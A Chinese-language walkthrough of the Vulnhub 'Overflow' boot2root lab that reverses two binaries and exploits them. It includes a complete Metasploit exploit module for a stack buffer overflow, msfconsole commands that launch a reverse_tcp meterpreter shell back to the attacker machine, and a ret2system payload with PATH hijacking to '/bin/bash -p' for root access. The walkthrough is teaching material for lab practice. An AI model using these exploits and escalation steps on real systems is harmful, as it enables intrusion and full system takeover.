# 渗透笔记之Overflow

阅读量 **343231**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-07-30 11:30:51

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t013be3308c429a98c6.jpg)

## 背景

[Overflow](https://www.vulnhub.com/entry/overflow-1,300/)是来自Vulnhub的boot2root靶机。下载下来的是一个OVA格式的虚拟机，可在VirtualBox中打开（不建议使用VMware）。虚拟机已设置DHCP，可自动获取IP。

本文较为完整地记录了对其进行渗透的全过程。该靶机难度为简单，需要攻击者具备逆向和缓冲区溢出的基本知识。

## 准备环境

首先[下载](https://download.vulnhub.com/overflow/Overflow.ova)靶机镜像，得到文件Overflow.ova，大小为493M。然后在VirtualBox中导入它，观察其配置，发现只有一块虚拟网卡，修改其连接方式为桥接网络。在同一网络中还有一台IP地址是192.168.1.200的Kali
Linux虚拟机（以下简称Kali）作为攻击者。

在Kali中运行命令netdiscover进行主机发现，确定靶机IP地址为：192.168.1.174。

## 信息收集

###  端口扫描

使用Nmap对靶机进行TCP端口扫描：

    
    
    nmap -sV -p- -Pn -n 192.168.1.174
    

扫描结果如下图所示，看到靶机开放了80端口和1337端口。

![](https://p4.ssl.qhimg.com/t0117f99a5d395948d3.png)

###  Web探测

访问<http://192.168.1.174:80/>，看到如下图所示的页面，有一个下载vulnserver的链接。

![](https://p2.ssl.qhimg.com/t01a1436bbe82b738c7.png)

出于习惯，查看页面源码，如下所示，没有什么收获。

    
    
    <html>
    Dirbuster is not needed. Here is the file : <a href="vulnserver" download>vulnserver</a>
    </html>
    

虽然网页中写到“Dirbuster is not
needed.”，但还是尝试了一下目录爆破，果然没有发现什么特别的目录。到目前为止，唯一的收获是vulnserver，把它下载下来。

## vulnserver研究

###  功能研究

下载vulnserver后首先使用file命令查看文件类型：

    
    
    file vulnserver
    

命令输出如下图所示，可以看出这是一个32位的ELF可执行文件。

![](https://p0.ssl.qhimg.com/t015026a8fbca110694.png)

给它可执行权限，并且执行它，看到它在监听1337端口，如下图所示。

![](https://p2.ssl.qhimg.com/t01f5363fc27dc61be6.png)

用Telnet去连接它，并进行交互，结果如下图所示。

![](https://p1.ssl.qhimg.com/t0177103429a1f11349.png)

容易验证，靶机中监听1337端口的为同一程序。看来这个程序应该有可以远程利用的缓冲区溢出漏洞，现在的任务是找出这个漏洞并利用它。

###  静态分析

先用checksec看看防护情况：

    
    
    checksec --file=vulnserver
    

如下图所示，看到什么防护都没有开启，最好不过了。

![](https://p0.ssl.qhimg.com/t016618855083d51e4c.png)

用IDA pro打开vulnserver，用F5逆向出main函数的C代码，这里只给出最关键的部分：

    
    
      /*
       * 省略绑定端口，进行监听的代码
       */
      while ( 1 )
      {
        v12 = accept(fd, &addr, &addr_len);
        if ( v12 < 0 )
          break;
        v3 = ntohs(*(uint16_t *)addr.sa_data);
        v4 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
        printf("Connection accepted from %s:%dn", v4, v3);
        v11 = fork();    // 注意这里开启了新进程
        if ( !v11 )
        {
          write(v12, "COMMAND : ", 0xAu);
          recv(v12, &buf, 0x400u, 0);    // 接收客户端发来的数据
          if ( !strncmp("OVERFLOW ", &buf, 9u) )    // 只比较前9个字符是否相等
          {
            handleCommand(&buf);    // 调用了函数handleCommand
            write(v12, "COMMAND DONEn", 0xDu);
          }
          else
          {
            write(v12, "TRY HARDER!n", 0xCu);
          }
        }
      }
      /*
       * 省略接下来的代码
       */
    

继续F5逆向handleCommand函数，结果如下所示：

    
    
    // Start address is 0x08049262
    char *__cdecl handleCommand(char *src)
    {
      char dest; // [esp+0h] [ebp-28h]
      return strcpy(&dest, src);
    }
    

调用了strcpy，显然handleCommand是有栈溢出漏洞的。

###  动态调试

刚开始调试时，将断点下在handleCommand函数开始处（0x08049262），不能成功中断，而是收到sigchld信号，调试失败。查阅资料后得知这是由于多进程的原因。

后来采取的调试方法是先运行vulnserver，然后用Telnet建立与vulnserver的连接，此时子进程已经生成，接着打开edb，使用Attach功能调试vulnserver的子进程（进程ID大的那个），如下图所示。

![](https://p0.ssl.qhimg.com/t01f9395d349cb2727d.png)

Attach后，将断点下在0x08049262，然后再输入COMMAND为“OVERFLOW 123456789”，如下图所示。

![](https://p2.ssl.qhimg.com/t0191aafa6a66defd21.png)

此时在edb中程序成功中断，如下图所示。

![](https://p4.ssl.qhimg.com/t0158be5995faa764c9.png)

单步运行至ret指令处，注意观察栈内数据，看到我们输入到“OVERFLOW
123456789”距离返回地址还有11行，也就是4×11=44个字符，如下图所示。

![](https://p2.ssl.qhimg.com/t01dc7ca98cb7f0fd08.png)

###  编写攻击代码

漏洞发掘完毕，接下来需要编写攻击代码。首先找跳板jmp esp（FF
E4），使用edb的BinarySearcher插件，成功地找到了唯一的跳板，位于0x0804929a，如下图所示。

![](https://p0.ssl.qhimg.com/t0155dd3cab5b1d13cc.png)

有了跳板，就可以编写攻击代码了。写了一个Metasploit的exploit模块，代码如下所示：

    
    
    ##
    # This module requires Metasploit: https://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    class MetasploitModule < Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Exploit::Remote::Tcp
    
      def initialize(info = {})
        super(update_info(info,
          'Name'           => 'Vulnserver Buffer Overflow',
          'Description'    => %q{
              This module exploits a stack buffer overflow in the vulnserver which froms a target machine called Overflow.
          },
          'Author'         => 'Werner <me[at]werner.wiki>',
          'License'        => BSD_LICENSE,
          'References'     =>
            [
              ['Vulnhub', 'https://www.vulnhub.com/entry/overflow-1,300/']
            ],
          'Platform'       => %w{ linux },
          'Targets'        =>
            [
              [
                'Vulnserver',
                {
                  'Platform' => 'linux',
                  'Ret'      => 0x0804929a,
                  'Offset'   => 44 - 9
                }
              ],
            ],
          'Payload'        =>
            {
              'BadChars'    => 'x0ax0dx00xff'
            },
          'DefaultTarget'  => 0,
          'DisclosureDate' => 'Jul 22 2019'))
    
        # Configure the default port to be 9080
        register_options(
          [
            Opt::RPORT(1337),
          ])
      end
    
    
      def exploit
        print_status("Connecting to target for exploitation.")
        connect
        print_good("Connection established successfully.")
        recv_buf = sock.get_once
        print_status("Received data: #{recv_buf}")
        buf = make_nops(target['Offset'])
        buf = 'OVERFLOW ' + buf + [target['Ret']].pack('V') + make_nops(20) + payload.encoded
        print_status("Sending exploit packet.")
        sock.put(buf)
        handler
        disconnect
      end
    end
    

将上述代码保存到文件vulnserver.rb中，然后将这个文件放在/usr/share/metasploit-framework/modules/exploits/linux/misc/中。

需要特别说明，我使用的Metasploit版本为5.0.27-dev。

完成上述工作后打开msfconsole，输入命令reload_all重载所有模块，看看有没有报错，如果没有报错，exploits的数量应该多了1，这说明模块vulnserver载入成功。

###  漏洞利用

当然先在本地进行测试，发现攻击代码是可用的。然后进行实际的攻击，进入msfconsole后使用我们刚刚编写的攻击模块vulnserver，设置payload为linux/x86/meterpreter/reverse_tcp，设置rhosts为靶机IP，设置lhost为Kali的IP地址。具体的命令如下：

    
    
    msf5 > use exploit/linux/misc/vulnserver
    msf5 exploit(linux/misc/vulnserver) > set payload linux/x86/meterpreter/reverse_tcp
    payload => linux/x86/meterpreter/reverse_tcp
    msf5 exploit(linux/misc/vulnserver) > set rhosts 192.168.1.174
    rhosts => 192.168.1.174
    msf5 exploit(linux/misc/vulnserver) > set lhost 192.168.1.200
    lhost => 192.168.1.200
    

设置完成后使用show options命令查看所有设置，如下图所示，检查下确定没有问题。

![](https://p4.ssl.qhimg.com/t0130785da587dd153a.png)

之后输入exploit开始攻击，但失败了。没有关系，多尝试几次，就会有一次成功获得meterpreter shell，如下图所示。

![](https://p0.ssl.qhimg.com/t018a991fd57ba45200.png)

###  探索

首先查看文件，找到了一个flag：user.txt，如下图所示。

![](https://p2.ssl.qhimg.com/t016d78837e0f878c44.png)

查看权限发现果然是普通用户，不是root。考虑提权，先搜索有suid标志的文件：

    
    
    ls -lh $(find / -perm -u=s -type f 2>/dev/null)
    

结果如下图，值得注意的是一个叫做printauthlog的程序。

![](https://p3.ssl.qhimg.com/t01af5c6b0e688db054.png)

考虑到后续可能依旧要使用溢出漏洞来提权，所以看看是否开启了地址随机化，发现是开启的，如下图所示。

![](https://p4.ssl.qhimg.com/t01e37989a04aaca101.png)

不管这些，先把printauthlog下载下来再说。

## printauthlog研究

###  功能研究

用file命令可以看出printauthlog也是一个32位的ELF可执行程序。同样先运行一下，发现是要输入一个密码。如下图和下下图所示。

![](https://p1.ssl.qhimg.com/t01d3b711782fef7ce2.png)

![](https://p2.ssl.qhimg.com/t01ea7bbeab5820aa16.png)

###  静态分析

先用checksec看看防护情况：

    
    
    checksec --file=printauthlog
    

如下图所示，看到开启了NX（不可执行），有点麻烦，直接jmp esp是不行了。

![](https://p3.ssl.qhimg.com/t01eac7953a52229911.png)

然后用IDA pro逆向，main函数比较短，直接给出全文：

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char command[4]; // [esp+0h] [ebp-7Ch]
      char v5; // [esp+1Ch] [ebp-60h]
      int *v6; // [esp+6Ch] [ebp-10h]
    
      v6 = &argc;
      strcpy(command, "/bin/cat /var/log/auth.log");
      memset(&v5, 0, 0x48u);
      if ( argc == 2 )
      {
        if ( checkPassword((char *)argv[1]) )
          puts("Wrong password");
        else
          shell(command);
      }
      else
      {
        printf("Usage: %s passwordn", *argv);
      }
      return 0;
    }
    

关键点显然在函数checkPassword，继续逆向出checkPassword的C代码，如下：

    
    
    // Start address is 0x80491C9
    int __cdecl checkPassword(char *src)
    {
      char s1[4]; // [esp+Fh] [ebp-49h]
      char dest; // [esp+18h] [ebp-40h]
    
      strcpy(s1, "deadbeef");
      strcpy(&dest, src);
      return strncmp(s1, &dest, 9u);
    }
    

又看到了strcpy，显然checkPassword也是有栈溢出漏洞的。

至于shell函数，其C代码为：

    
    
    int __cdecl shell(char *command)
    {
      return system(command);
    }
    

看到在shell函数中调用了system。

现在我们已经知道密码是deadbeef，试了下果然是正确的密码，如下图所示。但这对权限提升是没有帮助的。

![](https://p0.ssl.qhimg.com/t018d0cca5ed272c693.png)

###  动态调试

作为一个单进程程序，调试起来简单一点点。但这个程序需要一个命令行参数，所以用edb调试需要用如下的命令打开：

    
    
    edb --run ./printauthlog 123456
    

将程序停在checkPassword函数的ret指令处，如下图所示。

![](https://p0.ssl.qhimg.com/t01450e85e57fbc83cd.png)

数一数可以知道输入的123456距离返回地址有17行，即17×4=68个字符。但由于开启了NX，所以直接将返回地址覆盖为jmp
esp是不行的，实际上由于这个程序过于简单，也找不到jmp esp。

###  编写攻击代码

该如何利用这个漏洞呢？似乎只能用ROP了。但实际上不用那么复杂，因为我们注意到这个程序调用了system（函数shell中），我们只要准备好适当的参数，也调用system就好了。

第一个问题，确定system[@plt](https://github.com/plt "@plt")的地址。这使用objdump来完成：

    
    
    objdump -d -j .plt printauthlog
    

部分输出如下：

    
    
    08049060 <system@plt>:
     8049060:    ff 25 18 c0 04 08        jmp    *0x804c018
     8049066:    68 18 00 00 00           push   $0x18
     804906b:    e9 b0 ff ff ff           jmp    8049020 <.plt>
    

第二个问题，如何准备system的参数。这个问题有点麻烦，因为32位程序的参数是通过栈传递的，而system的参数是字符串指针。如下图所示是正常调用system[@plt](https://github.com/plt
"@plt")开始时的栈中数据情况，可以看到system的参数0xffd8462c是指向字符串的指针，而不是字符串本身。虽然可以将栈中数据覆盖为任意值，但由于地址的动态特性，我不知道有什么办法在构造shellcode时可以确定栈中字符串地址。

![](https://p2.ssl.qhimg.com/t01729a1d05a8e5642c.png)

因为这个问题迟迟没能解决，我几乎要放弃了。但正要放弃时，忽然想到了另一个靶机[HackInOS](https://blog.werner.wiki/penetrate-hackinos/)中通过命令劫持的方式实现了提权。那台靶机中有suid标志的可执行文件的C代码为：

    
    
    #include <unistd.h>
    #include <stdlib.h>
    
    int main(){
        setgid(0);
        setuid(0);
        system("whoami");
        return 0;
    }
    

通过劫持whoami命令，将whoami替换为“/bin/bash -p”成功提权。

回到面临的问题，其实我不需要把自己构造的字符串做为system的参数，几乎任意的字符串都可以做为system的参数，只要它是固定的（内容和地址都固定），不以“/”开头（以“/”开头没法劫持）。这样的字符串还是有很多的，比如“Wrong
password”。

首先确定“Wrong password”的地址，依旧使用BinarySearcher，找到其地址为0x0804a008，如下图所示。

![](https://p3.ssl.qhimg.com/t01e2aa7ec6f0c135fb.png)

然后就可以构造shellcode了，从前往后（栈中从上往下）依次是：

    
    
    17*4 字节的填充
    0x08049060：system@plt的地址
    0x080491C0：一个实际上不会用到的返回地址，单纯占位
    0x0804A008：“Wrong password”的地址，system的参数
    

由于printauthlog接收的是命令行参数，所以需要借助perl来输入“x08”这样的特殊字符（靶机中没有Python）。实际执行如下的命令完成攻击：

    
    
    ./printauthlog $(perl -e 'print "A"x(17*4)."x60x90x04x08"."xc0x91x04x08"."x08xa0x04x08"')
    

但现在执行上述命令还不能成功，因为我们还没有劫持“Wrong”命令。

###  实施攻击

首先从meterpreter shell进入到bash shell中，然后看看当前目录，发现是/home/user，如下图。

![](https://p3.ssl.qhimg.com/t01a1d9d267f22bc860.png)

然后建立一个名为Wrong的文件，内容为“/bin/bash -p”，并给它可执行权限，如下图。

![](https://p5.ssl.qhimg.com/t01bd36fce01d8b3b40.png)

接着在PATH中添加/home/user，如下所示。

    
    
    PATH="$PATH:/home/user"
    

![](https://p1.ssl.qhimg.com/t01a224b0fc5710c85f.png)

此时已完成对“Wrong”命令的劫持。最后运行攻击命令，获得一个有root权限的bash shell，如下图。

![](https://p4.ssl.qhimg.com/t01da3cb9aff6dbf1d9.png)

有了root权限，很容易就找到了root的flag，如下图。

![](https://p0.ssl.qhimg.com/t0189e2a3c9cf96bb1b.png)

flag是：

    
    
    dfd0ac5a9cb9220d0d34322878d9cd7b
    

当然由于shellcode过于简单，只要一退出root shell，程序就崩溃了，如下图。

![](https://p2.ssl.qhimg.com/t01edf1baf86abf718d.png)

## 总结

虽然就缓冲区溢出而言，这个靶机的难度只能算简单，但我对这方面知识的了解仅限于阅读过《0day安全：软件漏洞分析技术(第二版)》，而且还是三年前的事情了，所以对我来说还是有相当的挑战的，成功拿到root权限后，带来的成就感也是前所未有的。

在渗透的过程中，果然不能轻言放弃，而是要尝试所有的可能性。同时我也感受到了二进制的魅力——内存海洋的苦苦寻觅，不拘一格的漏洞利用。

做的不好的地方在于没有过多的思考就直接执行了从靶机中下载的可执行文件，应该准备一个专用的沙盒的。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Werner** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/182846](/post/id/182846)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [靶机](/tag/靶机)

 **+1** __16赞

 __收藏

![](https://p3.ssl.qhimg.com/t0109375382e6dc1bf0.png) Werner

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

